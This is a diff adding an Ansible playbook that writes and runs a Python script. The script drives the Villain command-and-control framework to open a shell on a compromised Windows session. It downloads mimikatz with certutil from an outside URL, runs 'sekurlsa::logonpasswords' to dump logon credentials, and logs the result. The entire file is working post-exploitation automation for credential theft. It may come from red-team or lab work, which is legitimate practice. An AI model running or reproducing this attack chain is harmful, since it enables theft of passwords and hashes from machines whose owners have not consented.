@@ -1,1 +1,53 @@
+---
+- name: Villain mimikatz creds
+  copy:
+    dest: /opt/mimikatz_creds.py
+    content: |
+       import pexpect
+       import re
+       import json
+       import time
 
+       with open('session.json', 'r') as json_file:
+            session_data = json.load(json_file)
+       session_ids = [session['Session ID'] for session in session_data]
+
+       for session_id in session_ids:
+           shell = f"shell {session_id}"
+
+       print(shell)
+
+       upload_mimikatz="certutil.exe -urlcache -f https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimikatz.exe?ref_type=heads sample.exe"
+
+       villain_prompt = '\x1b[4mVillain\x1b[0m > '
+       child = pexpect.spawn('villain -q', encoding='utf-8', timeout=50)
+       time.sleep(1.5)
+       child.expect(re.escape(villain_prompt))
+       child.sendline("sessions")
+       child.expect(re.escape(villain_prompt))
+       child.sendline("shell 3d88c8-2d1d5e-44e718")
+       child.expect(r"Undefined\\Undefined> ")
+       child.sendline("whoami")
+       child.expect(r"Undefined\\Undefined> ")
+       child.sendline(upload_mimikatz)
+       child.expect(r"Undefined\\Undefined> ")
+       child.sendline("""./sample.exe "privilege::debug" "sekurlsa::logonpasswords" exit""")
+       child.expect(r"Undefined\\Undefined> ")
+       child.sendline("exit")
+       res = child.before + child.after
+       with open('/opt/mimikatz.log', 'w') as f:
+            f.write(res)
+
+- name: Make the script executable
+  file:
+    path: /opt/mimikatz_creds.py
+    mode: '0755'
+
+
+- name: Run the Villain
+  shell: python3 /opt/mimikatz_creds.py
+  register: mimikatz_output
+
+- name: Display the output
+  debug:
+    msg: "{{ mimikatz_output.stdout }}"
